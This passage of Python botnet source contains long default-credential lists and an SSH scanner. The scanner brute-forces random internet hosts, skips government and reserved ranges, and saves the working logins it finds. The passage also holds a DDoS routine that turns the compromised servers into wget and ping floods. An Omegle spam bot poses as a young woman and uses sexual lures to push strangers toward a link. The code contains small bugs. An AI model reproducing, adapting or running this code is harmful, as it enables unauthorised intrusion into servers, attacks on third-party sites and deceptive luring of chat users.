    "mysql:2wsxzaq1",
    "mysql:2wsx",
    "mysql:1qazxsw2",
    "mysql:1qaz2wsx",
    "mysql:1qaz",
    "mysql:qwerty123",
    "mysql:qwerty12",
    "mysql:qwerty1",
    "mysql:qwerty123456",
    "mysql:qwert12345",
    "mysql:qwer1234",
    "mysql:qwe123",
    "mysql:123456qwerty",
    "mysql:12345qwert",
    "mysql:1234qwer",
    "mysql:123qwe",
    "postfixadmin:postifxadmin",
    "postfix:1qazxsw2",
    "postfix:1qaz2wsx",
    "postfix:1qaz",
    "postfix:qwerty123",
    "postfix:qwerty12",
    "postfix:qwerty1",
    "postfix:qwerty123456",
    "postfix:qwert12345",
    "postfix:qwer1234",
    "postfix:qwe123",
    "postfix:123456qwerty",
    "postfix:12345qwert",
    "postfix:1234qwer",
    "postfix:123qwe",
    "postgres:1qazxsw2",
    "postgres:1qaz2wsx",
    "postgres:1qaz",
    "postgres:qwerty123",
    "postgres:qwerty12",
    "postgres:qwerty1",
    "postgres:qwerty123456",
    "postgres:qwer1234",
    "postgres:qwe123",
    "postgres:123456qwerty",
    "postgres:12345qwert",
    "postgres:1234qwer",
    "postgres:123qwe",
    "web:1qazxsw2",
    "web:1qaz2wsx",
    "web:1qaz",
    "web:qwerty123",
    "web:qwerty12",
    "web:qwerty1",
    "web:qwerty123456",
    "web:qwert12345",
    "web:qwer1234",
    "web:qwe123",
    "web:123456qwerty",
    "web:12345qwert",
    "web:1234qwer",
    "web:123qwe",
    "user:!@#$%^&*",
    "user:user123",
    "user:!@#$%^",
    "user:qwe321",
    "user:qwer4321",
    "user:1234rewq",
    "user:123ewq",
    "user:us3r",
    "user:2wsxzaq1",
    "user:1qazxsw2",
    "user:1qaz2wsx",
    "user:2wsx",
    "user:1qaz",
    "user:zxcasdqwe123",
    "user:zxcasdqwe",
    "user:zxcasd",
    "user:asdzcx",
    "user:qweasdzcx",
    "user:qweasd",
    "user:123qweasdzc",
    "user:123qweasd",
    "user:qwert12345",
    "user:qwer1234",
    "user:qwe123",
    "user:1234qwer",
    "user:123qwe",
    "user:user!@",
    "user:user!",
    "user:user!@#",
    "webmaster:!@#webmaster",
    "info:inf0",
    "testuser:usertest",
    "testuser:tester",
    "testuser:test1234",
    "testuser:testuser",
    "guest:guestguest",
    "guest:gu3st",
    "guest:abcd1234",
    "guest:123abc",
    "guest:abc123",
    "guest:2wsxzaq1",
    "guest:2wsx1qaz",
    "guest:2wsx",
    "guest:1qazxsw2",
    "guest:1qaz2wsx",
    "guest:1qaz",
    "guest:zxcasdqwe123",
    "guest:zxcasdqwe",
    "guest:zxcasd",
    "guest:qweasdzxc",
    "guest:asdzxc",
    "guest:qweasd",
    "guest:123qweasdzxc",
    "guest:123qweasd",
    "guest:qwerty12",
    "guest:qwerty1",
    "guest:qwerty",
    "guest:qwert12345",
    "guest:qwer1234",
    "guest:qwe123",
    "guest:12345qwert",
    "guest:1234qwer",
    "guest:123qwe",
    "guest:guest!@#",
    "guest:guest!@",
    "guest:guest!",
    "webmaster:w3b",
    "webmaster:w3bm@st3r",
    "webmaster:w3bm4st3r",
    "webmaster:w3bmaster",
    "tomcat:tomc4t",
    "tomcat:t0mc@t",
    "tomcat:t0mc4t",
    "spam:nospam",
    "spam:sp@m",
    "spam:maps",
    "spam:password",
    "spam:123456",
    "spam:12345",
    "spam:1234",
    "spam:123",
    "spam:spam123",
    "psoft:ps0ft",
    "psoft:password",
    "psoft:psoft123",
    "psoft:psoftpsoft",
    "psoft:123456",
    "psoft:psoft",
    "tuxedo:qwer1234",
    "tuxedo:1234qwer",
    "tuxedo:qwe123",
    "tuxedo:123qwe",
    "tuxedo:1qazxsw2",
    "tuxedo:1qaz2wsx",
    "tuxedo:1qaz",
    "tuxedo:123123",
    "tuxedo:odexut",
    "tuxedo:tux3do",
    "tuxedo:tuxed0",
    "tuxedo:tux3d0",
    "tuxedo:password",
    "tuxedo:123456",
    "tuxedo:tuxedo123",
    "tuxedo:tuxedotuxedo",
    "tuxedo:tuxedo",
    "apache:apach3",
    "postgres:ubuntu",
    "postgres:redhat",
    "tomcat:panadepula",
    "oracle:panadepula",
    "postgres:panadepula",
    "user:panadepula",
    "mailing:mailing",
    "info2:info2",
    "webadm:webadm123",
    "soporte:s0p0rt3",
    "postmaster:postmaster",
    "shit:shit",
    "test:testtest",
    "test:t3st1ng",
    "test:p@ssw0rd",
    "test:zxcasdqwe123",
    "test:zxcasdqwe",
    "test:zxcasd",
    "test:123qweasdzzxc",
    "test:123qweasd",
    "test:ts3t",
    "test:t3mp",
    "test:t35t",
    "test:t3st",
    "test:testpassword",
    "test:tsettset",
    "test:tset",
    "test:testpass",
    "test:1qazxsw2",
    "test:1qaz2wsx",
    "test:1qaz",
    "test:qwerty123",
    "test:qwerty12",
    "test:qwerty1",
    "test:qwerty123456",
    "test:qwert12345",
    "test:qwer1234",
    "test:qwe123",
    "test:123456qwerty",
    "test:12345qwert",
    "test:1234qwer",
    "test:123qwe",
    "test:abcd1234",
    "test:abcd",
    "test:abc",
    "test:abc123",
    "test:zxc123",
    "test:xsw22wsx",
    "test:zaq11qaz",
    "test:1q2w3e",
    "test:q1w2e3",
    "test:123123123",
    "test:1234321",
    "test:12344321",
    "test:123321",
    "test:12341234",
    "test:112233",
    "test:secret",
    "test:zxcasq",
    "test:1qwasdzxcv",
    "test:asdfqwer1234",
    "test:asdfqwer",
    "test:qwerasdf",
    "test:zaqxswcde",
    "test:qazxsw",
    "test:zaqwsx",
    "test:passwd",
    "test:us3r",
    "test:user",
    "test:temp",
    "test:t0mc@t",
    "test:t0mcat",
    "test:passw0rd",
    "test:p@ssword",
    "test:p4ssw0rd",
    "test:password",
    "test:12321",
    "test:123123",
    "test:asdzxc",
    "test:123qweasdzxc",
    "test:asdfgh",
    "test:asdfg",
    "test:asdf",
    "test:asd",
    "test:zxcvbn",
    "test:zxcvb",
    "test:zxcv",
    "test:zaq12wsx",
    "test:!@#$1234",
    "test:!@#123",
    "test:1234!@#$",
    "test:123!@#",
    "test:11111111",
    "test:1111111",
    "test:111111",
    "test:11111",
    "test:1111",
    "test:111",
    "test:000000000",
    "test:00000000",
    "test:0000000",
    "test:000000",
    "test:00000",
    "test:000",
    "test:123456789",
    "test:12345678",
    "test:1234567",
    "test:12345",
    "test:654321",
    "test:pass1111",
    "test:pass0000",
    "test:q1w2e3r4",
    "test:pass11",
    "test:54321",
    "test:pass00",
    "test:4321",
    "test:pass1234",
    "test:1q2w3e4r",
    "test:a1b2c3d4",
    "test:pass",
    "test:a1b2c3",
    "test:drowssap",
    "test:0000",
    "test:ssap",
    "test:qwerty",
    "test:pass123",
    "test:qazwsx",
    "test:testme",
    "test:panadepula",
    "oper:oper",
    "root:root1234",
    "root:adminadmin",
    "root:meiyoumima",
    "root:963963369",
    "root:calvin",
    "root:passw0rd",
    "root:public",
    "root:idc2010",
    "root:admin@123",
    "root:pass123",
    "root:P@$$w0rd",
    "root:rootme",
    "root:rootpass",
    "root:admin123",
    "root:rrrrrrrrrr",
    "root:passwoord",
    "root:123.com",
    "root:123",
    "root:firewall",
    "root:r00t",
    "root:password1",
    "root:abc@123",
    "root:admin1234",
    "root:cisco123",
    "root:P@ssword",
    "root:oracle",
    "root:rootroot",
    "nobody:nobody",
    "notes:notes",
    "root:muie123",
    "oracle:n8yfzvws",
    "library:qwerty",
    "oracle:muie123",
    "user:123456",
    "view:view123",
    "web:web",
    "password:123456",
    "portal:portal",
    "user:xinformation3",
    "root:sorinake",
    "root:qazwsx",
    "teste:teste",
    "max:max",
    "hyaso:hyaso3501",
    "ftpuser:ftpuser",
    "backup:backup",
    "itsus:its12345",
    "userftp:7522852",
    "root:system",
    "rajesh:rajesh",
    "public:123456",
    "SirKobe:SirKobe123",
    "nagios:nagios",
    "root:changeme",
    "root:administrator",
    "LosAngeles:LosAngeles123",
    "informix:1qaz2wsx",
    "snifer1992:173.201.183.98",
    "weblogic:weblogic",
    "yeocheon:so1419",
    "xuwenxiao:xuWenxiao#1860",
    "root:qazwsxedc",
    "robert:robert",
    "root:muiebagatiaipulainmata",
    "oracle:password",
    "root:sugipula",
    "root:matrix",
    "password:mysql",
    "applprod:applprod",
    "upload:upload",
    "michael:michael",
    "marta:marta",
    "root:bagabu",
    "play:play",
    "root:celceumblanoaptea",
    "root:369852147",
    "root:111222",
    "cs:cs",
    "test:test12",
    "alfowner:alfresco",
    "jboss:jboss",
    "display:display",
    "rosales:rosales",
    "esteban:esteban",
    "root:master",
    "root:siemens",
    "mythtv:mythtv",
    "root:sorinake123",
    "root:y0uc@n7g371n",
    "root:ch4ngem3",
    "music:music",
    "mysql:123456",
    "tester:123456",
    "root:daudebautlaovi",
    "test:testing",
    "root:qwe123",
    "hosting:hosting",
    "serv1.xserv.us:53412",
    "root:sbkomales131124",
    "a:a",
    "root:Ki!l|iN6#Th3Ph03$%nix@NdR3b!irD",
    "ubuntu:ubuntu",
    "adam:adam",
    "ssh:ssh",
    "thomas:thomas",
    "server:server",
    "user1:user1",
    "marcel:marcel",
    "jan:jan",
    "root:root@12345",
    "188.241.39.24:2323",
    "appserver:appserver",
    "pc:barhy88",
    "kobe:kobe",
    "root:1",
    "root:pa55word",
    "root:1qazse4",
    "root:s",
    "root:vmware",
    "root:r00t123",
    "root:mnbvcxz",
    "root:12qwaszx",
    "root:rootadmin",
    "oracle:oracle123",
    "root:147852",
    "root:2wsx3edc",
    "root:1qa2ws3ed",
    "root:778899",
    "root:key",
    "root:1qa2ws3ed4rf5tg",
    "rsync:rsync",
    "postgres:123",
    "istvan:istvan",
    "root:shadow@@@ubyta336331jumjum",
    "polycom:polycom",
    "oracle:oracle",
    "root:010101",
    "root:a",
    "root:1qazXSW@",
    "root:ferrari",
    "root:redtube",
    "test:testuser",
    "test:tester",
    "root2:123",
    "test:test1",
    "test:test2",
    "test:test3",
    "test:test4",
    "bill:bill",
    "root:user",
    "root:nobody",
    "root:web",
    "root:news",
    "root:info",
    "root:sysadmin",
    "root:cvsadm",
    "root:spam",
    "root:techsupport",
    "root:ssh",
    "root:synopass",
    "arca1hn151",
    "admin:admins",
    "root:r00tp455w0rD",
    "root:cyb3ramri3s",
    "grace:grace",
    "mia:mia",
    "root:service",
    "root:uploader",
    "root:teiubesc",
    "admin:123123",
    "root:spiderman",
    "root:webmin",
    "root:poiuyt",
    "root:ubuntu123",
    "root:school",
    "root:education",
    "root:aaa",
    "root:security",
    "root:david",
    "root:aaaaaa",
    "root:controller",
    "root:solomon",
    "root:god",
    "root:happy",
    "root:singnin",
    "root:einstein",
    "root:slider",
    "root:sleeper",
    "user1:123456"
]
password_list_D = [
 "root:root",
 "root:toor",
 "root:1234",
 "root:123",
 "root:12345",
 "root:1q2w3e",
 "root:1q2w3e4r",
 "root:abc123",
 "root:sysnopass",
 "root:ssh",
 "root:aaaa",
 "root:r00t",
 "root:redhat",
 "root:redtube",
 "root:123456",
 "root:1q2w3e4r5t",
 "root:qwerty",
 "root:password",
 "root:admin",
 "root:passwd",
 "root:test",
 "root:test123",
 "root:linux",
 "root:user",
 "root:1",
 "root:administrator",
 "root:p@ssw0rd",
 "root:123qwe",
 "root:matrix",
 "root:sleeper",
 "root:slider",
 "root:333333",
 "root:444444",
 "root:einstein",
 "root:singnin",
 "root:!@#$%^",
 "root:555555",
 "root:happy",
 "root:666666",
 "root:god",
 "root:solomon",
 "root:a",
 "root:controller",
 "root:666",
 "root:777777",
 "root:88888",
 "root:999999",
 "root:aaaaaa",
 "root:security",
 "root:aaa",
 "root:education",
 "root:school",
 "root:zxcvbn",
 "root:ubuntu123",
 "root:asdfgh",
 "root:zxcvbnm",
 "root:poiuyt",
 "root:111111",
 "root:000000",
 "root:ubuntu",
 "root:mandrake",
 "root:a1b2c3",
 "root:1a2b3c",
 "root:......",
 "root:root123",
 "root:webmin",
 "root:webmaster",
 "root:12345678",
 "root:master",
 "root:apache",
 "root:unix",
 "root:login",
 "root:nobody",
 "root:operator",
 "root:suse",
 "root:root2007",
 "root:mandriva",
 "root:222222",
 "root:darwin",
 "root:academic",
 "root:access",
 "root:anarchy",
 "root:anything",
 "root:backdoor",
 "root:bartman",
 "root:baseball",
 "root:batman",
 "root:binary",
 "root:catholic",
 "root:changeme",
 "root:company",
 "root:connect",
 "root:continue",
 "root:control",
 "root:country",
 "root:daemon",
 "root:dancer",
 "root:haunted",
 "root:database",
 "root:newuser",
 "root:renault",
 "root:default",
 "root:director",
 "root:enable",
 "root:expert",
 "root:ferrari",
 "root:florida",
 "root:forever",
 "root:mercedes",
 "root:fucker",
 "root:fucking",
 "root:gigabyte",
 "root:hardcore",
 "root:harmony",
 "root:inside",
 "root:johndoe",
 "root:keyword",
 "root:lakers",
 "root:laptop",
 "root:loginpass",
 "root:member",
 "root:metalica",
 "root:newyork",
 "root:opening",
 "root:outlook",
 "root:outside",
 "root:penguin",
 "root:pentium",
 "root:phoenix",
 "root:private",
 "root:really",
 "root:running",
 "root:search",
 "root:siemens",
 "root:signature",
 "root:simple",
 "root:somebody",
 "root:starwars",
 "root:success",
 "root:summer",
 "root:motorola",
 "root:superuser",
 "root:nokia",
 "root:trojan",
 "root:unknown",
 "root:unlock",
 "root:zero",
 "root:hiphop",
 "root:freebsd",
 "root:openbsd",
 "root:toyota",
 "root:suzuki",
 "root:fudball",
 "root:love",
 "root:1234567",
 "root:12345678910",
 "root:12345679",
 "root:superman",
 "root:badman",
 "root:secure",
 "root:spiderman",
 "root:punisher",
 "root:europe",
 "root:root12",
 "root:formula1",
 "root:thanks",
 "root:jupiter",
 "root:mars",
 "root:neptun",
 "root:computer",
 "root:king",
 "root:prometheus",
 "root:sexy",
 "root:123qwer",
 "root:qwer123",
 "root:movies",
 "root:invisible",
 "root:crazy",
 "root:music",
 "root:654321",
 "root:0987654321",
 "root:webpage",
 "root:apollo",
 "root:mistake",
 "root:party",
 "root:321",
 "root:goldfish",
 "root:root2008",
 "root:wolf",
 "root:madmax",
 "root:webadmin",
 "root:escape",
 "root:compaq",
 "root:dell",
 "root:indiana",
 "root:arisona",
 "root:money",
 "root:monday",
 "root:friday",
 "root:counter",
 "root:brasil",
 "root:india",
 "root:marlboro",
 "root:columbia",
 "root:france",
 "root:denmark",
 "root:hongkong",
 "root:china",
 "root:qwerty123",
 "root:qwe123",
 "root:root2006",
 "root:ghost",
 "root:connection",
 "root:iloveyou",
 "root:qazwsx",
 "root:xswzaq",
 "root:proxy",
 "root:london",
 "root:paris",
 "root:desktop",
 "root:cvscvsroot",
 "root:cvs123456",
 "root:help",
 "root:help123",
 "root:thief",
 "root:rebel",
 "root:myspace1",
 "root:qwerty1",
 "root:monkey",
 "root:bio123",
 "root:q1w2e3",
 "root:1a2s3d",
 "root:a1s2d3",
 "root:bingo",
 "root:qwaszx",
 "root:zaq12wsx",
 "root:judge",
 "root:4rfvgy7",
 "root:1qaz2wsx",
 "root:design",
 "root:112233",
 "root:ghbdtn",
 "root:aaa123",
 "root:bbbbbb",
 "root:cccccc",
 "root:servers",
 "root:pinkpanter",
 "root:junker",
 "root:mikimaus",
 "root:azrael",
 "root:lilit",
 "root:bentley",
 "root:hello",
 "root:1234qwer",
 "root:123qwerty",
 "root:12qwerty",
 "root:qwerty1234",
 "root:qwer1234",
 "root:qwert1",
 "root:router",
 "root:asdfghjkl",
 "root:asd123",
 "root:321asd",
 "root:123asd",
 "root:1z2x3c",
 "root:123123",
 "root:festival",
 "root:stars",
 "root:postgres",
 "root:cupsys",
 "root:earth",
 "root:venus",
 "root:mercury",
 "root:hsqldb",
 "root:market",
 "root:skynet",
 "root:readme",
 "root:trustno1",
 "root:qazwsxedc",
 "root:qpwoeiruty",
 "root:secret",
 "root:root123321",
 "root:pass123",
 "root:1i2o3p",
 "root:i1o2p3",
 "root:pqowie",
 "root:qpwoei",
 "root:zaqxsw",
 "root:aqswdefr",
 "root:zaxscdvf",
 "root:qawsedrf",
 "root:asdfghj",
 "root:lpkojihu",
 "root:plokijuh",
 "root:wasd",
 "root:qwaesz",
 "root:eszrdx",
 "root:zsexdr",
 "root:qawzse",
 "root:kenwod",
 "root:kenwood",
 "root:apache123",
 "root:redhat123",
 "root:magic",
 "root:sanjose",
 "root:runner",
 "root:secretariat",
 "root:storage",
 "root:beach",
 "root:secretar",
 "root:teiubesc",
 "root:loveyou",
 "root:a1a1a1",
 "root:b1b2b3",
 "root:dagmar",
 "root:remote",
 "root:dragon",
 "root:internet",
 "root:star",
 "root:stargate",
 "root:gateway",
 "root:******",
 "root:univers",
 "root:iamroot",
 "root:superstar",
 "root:super",
 "root:classic",
 "root:mozilla",
 "root:knoppix",
 "root:game",
 "root:advance",
 "root:library",
 "root:date",
 "root:cedric",
 "root:student",
 "root:system",
 "root:testing",
 "root:photo",
 "root:photos",
 "root:demo",
 "root:email",
 "root:firebird",
 "root:firegate",
 "root:techno",
 "root:lotus",
 "root:download",
 "root:domain",
 "root:business",
 "root:myroot",
 "root:designer",
 "root:^^^^^^",
 "root:atutor",
 "root:hidden",
 "root:mydb",
 "root:cisco",
 "root:information",
 "root:albatross",
 "root:hacker",
 "root:pawned",
 "root:!root",
 "root:NeXT",
 "root:QNX",
 "root:attack",
 "root:ax400",
 "root:bagabu",
 "root:blablabla",
 "root:sex",
 "root:nimda",
 "root:oracle",
 "root:alpine"
]
def sshScanner(zipclassinfo, username_password_combo_list, use_gov_ip_blocklist, tcp_ping_timeout, ssh_ping_timeout, min_chars, max_chars, ports, send_to_server):
    ipclassinfos = 0
    for checkAmount in zipclassinfo.split("/")[1].split(","):
        ipclassinfos=ipclassinfos+1
    while doSSHscan == True:
        while doSSHscan == True:
            try:
                while doSSHscan == True:
                    thisipisbad=False
                    ipclassinfoNumber = randrange(0,ipclassinfos)
                    ipclassinfo = zipclassinfo.split("/")[0].split(",")[ipclassinfoNumber]
                    if ipclassinfo.lower() == "a":
                        ip1 = zipclassinfo.split("/")[1].split(",")[ipclassinfoNumber]
                        host = "http://"+ip1+"."+str(randrange(0,256))+"."+str(randrange(0,256))+"."+str(randrange(0,256))
                    elif ipclassinfo.lower() == "b":
                        ip = zipclassinfo.split("/")[1].split(",")[ipclassinfoNumber]
                        ip1 = ip.split(".")[0]
                        ip2 = ip.split(".")[1]
                        host = "http://"+ip1+"."+ip2+"."+str(randrange(0,256))+"."+str(randrange(0,256))
                    elif ipclassinfo.lower() == "c":
                        ip = zipclassinfo.split("/")[1].split(",")[ipclassinfoNumber]
                        ip1 = ip.split(".")[0]
                        ip2 = ip.split(".")[1]
                        ip3 = ip.split(".")[3]
                        host = "http://"+ip1+"."+ip2+"."+ip3+"."+str(randrange(0,256))
                    elif ipclassinfo.lower() == "lucky":
                        lucky = [ "186.115", "31.176", "113.53", "186.113", "190.254", "190.255", "186.114", "95.9", "95.6", "118.174", "190.65", "203.249", "190.66", "190.67", "122.176", "187.109", "60.51", "186.119", "95.169", "190.69", "190.253", "122.168", "201.75", "117.156", "188.59", "177.11", "182.74", "190.68", "118.173", "190.252", "165.229", "84.122", "RAND" ]
                        startIP = choice(lucky)
                        if not startIP == "RAND":
                            host = "http://"+choice(startIP)+"."+str(randrange(0,256))+"."+str(randrange(0,256))
                        else:
                            host = "http://"+str(randrange(0,256))+"."+str(randrange(0,256))+"."+str(randrange(0,256))+"."+str(randrange(0,256))
                    else:
                        host = "http://"+str(randrange(0,256))+"."+str(randrange(0,256))+"."+str(randrange(0,256))+"."+str(randrange(0,256))
                    if use_gov_ip_blocklist == True:
                        for badip in govips:
                            if not doSSHscan == True:
                                break
                            if not "http://" in badip.lower():
                                badip="http://"+badip
                            if badip in host:
                                thisipisbad=True
                    for badip in reservedips:
                        if not doSSHscan == True:
                            break
                        if badip in host:
                            thisipisbad=True
                    if thisipisbad==False:
                        break
                host=host.replace("http://", "").replace("HTTP://","")
                username=""
                port=0
                password=""
                doAttack=False
                s = socket(AF_INET, SOCK_STREAM)
                s.settimeout(tcp_ping_timeout)
                if "," in ports and doSSHscan == True:
                    if doSSHscan == False:
                        break
                    for aport in ports.split(","):
                        if doSSHscan == False:
                            break
                        worked = False
                        try:
                            port = int(aport)
                            if doSSHscan == True:
                                s.connect((host, port))
                            s.close()
                            worked=True
                        except:
                            pass
                        if worked == True:
                            doAttack=True
                            break
                elif doSSHscan == True:
                    port=int(ports)
                    if doSSHscan == True:
                        s.connect((host, port))
                    s.close()
                    doAttack = True
                if not doSSHscan == True:
                    break
                if not doAttack == True:
                    raise Exception("No open ports!")
                ssh = SSHClient()
                ssh.set_missing_host_key_policy(AutoAddPolicy())
                dobreak=False
                stra = ""
                passwords = []
                if username_password_combo_list.lower() == "a" and doSSHscan == True:
                    passwords = password_list_A
                elif username_password_combo_list.lower() == "b" and doSSHscan == True:
                    passwords = password_list_B
                elif username_password_combo_list.lower() == "c" and doSSHscan == True:
                    passwords = password_list_C
                elif username_password_combo_lust.lower() == "d" and doSSHscan == True:
                    passwords = password_list_D
                elif username_password_combo_list.lower() == "brute":
                    clist="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_+=~`[]{}|\:;<>,.?/"
                    for d in range(min_chars,max_chars):
                        if doSSHscan == True:
                            for c in generate(clist,d):
                                if doSSHscan == True:
                                    passwords.append(c)
                                else:
                                    break
                        else:
                            break
                elif doSSHscan == True:
                    passwords = urlopen(username_password_combo_list.replace("HTTPS","https").replace("HTTPs","https").replace("HTTP","http").replace("FTPS","ftps").replace("FTPs","ftps").replace("FTP","ftp").replace(".ONION/",".onion/")).read().split()
                for passwd in passwords:
                    try:
                        if ":n/a" in passwd:
                            password=""
                        else:
                            password=passwd.split(":")[1]
                        if "n/a:" in passwd:
                            username=""
                        else:
                            username=passwd.split(":")[0]
                        if doSSHscan == True:
                            ssh.connect(host, port = port, username=username, password=password, timeout=ssh_ping_timeout)
                        else:
                            break
                        dobreak=True
                        break
                    except:
                        if doSSHscan == False:
                            break
                        pass
                    if True == dobreak and doSSHscan == True:
                        break
                if doSSHscan == True:
                    badserver=True
                    stdin, stdout, stderr = ssh.exec_command("/sbin/ifconfig")
                    output = stdout.read()
                    if doSSHscan == False:
                        break
                    stdin, stdout, stderr = ssh.exec_command("/usr/bin/lscpu")
                    output = output + stdout.read()
                    router = False
                    if "GenuineIntel" in output or "i686" in output or "x86" in output or "32-bit" in output or "64-bit" in output or "i386" in output:
                        badserver=False
                        router = False
                    elif "inet addr" in output:
                        router = True
                        badserver = False
                    if badserver == False:
                        stra = username+":"+password+":"+host+":"+str(port)
                        ListHosts = ""
                        if path.isfile(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile) and doSSHscan==True:
                            try:
                                f = open(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile, "r")
                                ListHosts = f.read().split("\n")
                                f.close()
                            except:
                                pass
                        badStra=False
                        for host in ListHosts:
                            if doSSHscan == False:
                                break
                            try:
                                if b64decode(host) == stra:
                                    badStra=True
                            except:
                                pass
                            if badStra == True:
                                break
                        if badStra == False and doSSHscan == True:
                            if doSSHscan == False:
                                break
                            try:
                                f = open(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile, "a")
                                if "" == ListHosts:
                                    f.write(b64encode(stra))
                                else:
                                    f.write("\n"+b64encode(stra))
                                f.close()
                            except:
                                pass
            except:
                pass

def ddos(command, server, port, user, password, processes):
    try:
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        ssh.connect(server, port=port, username=user, password=password, timeout=35)
        if processes < 1:
            processes=1
        for x in range(0,processes):
            newcommand=command
            if "%rand%" in newcommand:
                newcommand = newcommand.replace("%rand%", str(randrange(0,25565)))
            if "%useragent%" in newcommand:
                newcommand = newcommand.replace("%useragent%", choice(useragents))
            if "wget" in newcommand:
                ssh.exec_command(newcommand.replace("wget", "wget1"))
            ssh.exec_command(newcommand)
            if "STOPDDOS" == newcommand:
                apps = [ "wget", "ping", "sh", "bash" ]
                killtools = [ "killall", "pkill" ]
                for app in apps:
                    for killtool in killtools:
                        ssh.exec_command(killtool+" "+app)
                        ssh.exec_command("/usr/bin/"+killtool+" "+app)
                        ssh.exec_command("/bin/"+killtool+" "+app)
                        ssh.exec_command("/sbin/"+killtool+" "+app)
                        ssh.exec_command("/usr/sbin"+killtool+" "+app)
        ssh.close()
    except:
        pass
def sshDDoS(mode, server, processes):
    command=""
    if mode == 1:
        if not "http://" in server.lower() and not "ftp://" in server.lower() and not "ftps://" in server.lower() and not "https://" in server.lower():
            server="http://"+server
        if not server.endswith("/"):
            server = server + "/"
        command="while true; do wget "+server+" -O /dev/null -U "%useragent%" 2> /dev/null; done"
    elif mode == 2:
        command="STOPDDOS"
    elif mode == 3:
        command = "ping " + server + " -i 1 > /dev/null &"
    if path.isfile(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile):
        f = open(getenv("APPDATA")+sshdsAppDataFolder+sshdsFile, "r")
        roots = f.read()
        f.close()
        roots = roots.split()
        for host in roots:
            server=""
            port=22
            user=""
            password=""
            try:
                user=b64decode(host).split(":")[0]
            except:
                pass
            try:
                password=b64decode(host).split(":")[1]
            except:
                pass
            try:
                server=b64decode(host).split(":")[2]
            except:
                pass
            try:
                port=int(b64decode(host).split(":")[3])
            except:
                pass
            while 1:
                worked=False
                try:
                    start_new_thread(ddos, (command, server, port, user, password, processes))
                    worked=True
                except:
                    pass
                if worked == True:
                    break

def fmtId( string ):
    try:
        return string[1:len( string ) - 1]
    except:
        pass

def listenServer( id, req, skypeornot, skiurl ):
    count = 0
    while True == doomeglespreader:
        try:
	    site = urlopen2(req)
	    rec = site.read()
	    if "strangerDisconnected" in rec and True == doomeglespreader:
		count = 0
		omegleConnect(skypeornot, skiurl)
	    elif "connected" in rec and True == doomeglespreader:
		    count = 0
                    greetings = [
                        "Hi",
                        "Hallow",
                        "Hey",
                        "Hello",
                        "Sup",
                        "Wassup",
                        "Waddhup",
                        "Heyy",
                        "Heyyy",
                        "Hai",
                        "Hiya",
                        "Hey there",
                        "Hello there",
                        "Hey how r u",
                        "Hey, how r u",
                        "Hey, how are you?",
                        "Hey, how are ya?",
                        "hi",
                        "hallow"
                        "hey",
                        "hello",
                        "sup",
                        "wassup",
                        "waddhup"
                        "heyy",
                        "heyyy",
                        "hai",
                        "hiya",
                        "hey there",
                        "hello there",
                        "hey how r u"
                        "asl?",
                        "ASL?",
                        "asl",
                        "Asl",
                        "ASL",
                        "Asl?"
                    ]
                    emoticons = [ ":)", ":-)", ":3", "(:", "(-:", "^_^", ";)", "(;", ":P", ";P", ":p", ";p", ":-]", ":]", "[-:", "[:", "=]", "[=", "=P", "=p", "=3", "lol" ]
		    talk(id,req,choice(greetings)+" "+choice(emoticons))
	    elif "gotMessage" in rec and True == doomeglespreader:
		    input=rec[16:len( rec ) - 2]
		    if count == 0 and True == doomeglespreader:
                        ages = [ "18", "19", "20", "21", "22", "23", "24", "25", "26", "27" ]
                        countries = [ "usa", "us", "canada", "Canada", "US", "USA", "Russia", "russia", "peru", "Peru", "Italy", "Brazil", "UK", "uk", "italy", "brazil" ]
                        female = [ "/f", "f", " f", "/female", " female", "/fem", " fem" ]
                        result = choice(ages)+choice(female)+" "+choice(countries)
                        talk(id,req,result)
                        count += 1
		    elif count == 1 and True == doomeglespreader:
                        wanna = [
                            "wanna",
                            "Wanna",
                            "want to",
                            "Want to",
                            "would you like to",
                            "Would you like to",
                            "would ya like to",
                            "Would ya like to",
                            "would you want to",
                            "Would you want to"
                            ]
                        checkout = [
                            "check out",
                            "see",
                            "look at"
                        ]
                        some = [
                            "some",
                            "a couple",
                            "my",
                            "a few",
                            "a bit of my",
                            "sum"
                        ]
                        pics = [
                            "pics",
                            "pictures",
                            "picz",
                            "nudez",
                            "nudes"
                        ]
                        descriptions = [ "hot", "sexy", "nude", "18+", "lesbian" ]
                        webcam = [
                            "webcam",
                            "cam",
                            "Webcam",
                            "WebCam",
                            "camshow",
                            "CamShow",
                            "cam show",
                            "webcam show",
                            "WebCam show", 
                            "Webcam show" 
                        ]
                        emoticons = [":)", ":-)", ":3", "(:", "(-:", "^_^", ";)", "(;", ":P", ";P", ":p", ";p", ":-]", ":]", "[-:", "[:", "=]", "[=", "=P", "=p", "=3", "lol", "^^", ";*", ":*", ":3" ]
                        an = [ "and", "an" ]
                        bodylooks = [ "tell me how my body looks", "tell me if my body is sexy", "tell me if my body looks nice?", "tell me what you think about my body?" ]
                        luring1 = choice(wanna)+" "+choice(checkout)+" "+choice(some)+" "+choice(pics)+" "+choice(an)+" "+choice(bodylooks)+" "+choice(emoticons)
                        luring2 = choice(wanna)+" "+choice(checkout)+" my "+choice(descriptions)+" "+choice(webcam) 
                        which = randrange(1,2)
                        if which == 1:
			    result = luring1
                        else:
                            result = luring2 
			talk(id,req,result)
			count += 1
		    elif count == 2 and True == doomeglespreader:
                        ok = [ "ok", "kk", "k", "o ok", "okay", "Ok", "K", "Okay", "kk", "mkay", "kay", "oki", "kayy" ]
                        if skypeornot == True:
                            addme = [ "add me", "send me a friend request" ]
                            skype = [ "Skype", "skype", "skipe", "Skipe", "$kype" ]
			    result="%s %s on %s at %s" % (choice(ok), choice(addme), choice(skype), skiurl)
                        else:
                            words = [ "here you go", "here ya go", "here u go", "here goes nothing", "check it out", "here you go", "say hi on there"]
                            harsh = [ "don't be harsh ok!", "dont be harsh ok!", "don't be harsh, okay!", "hope u like it" ]
                            result="%s %s %s %s" % (choice(ok), choice(words), skiurl, choice(harsh))
			talk(id,req,result)
			count += 1
		    elif count == 3 and True == doomeglespreader:
                        thanks = [ "Thanks hun! ", "Thank u ", "Thanks! ", "Thank you! ", "thanks u", "thx", "thx!", "thanx!", "thanx" ]
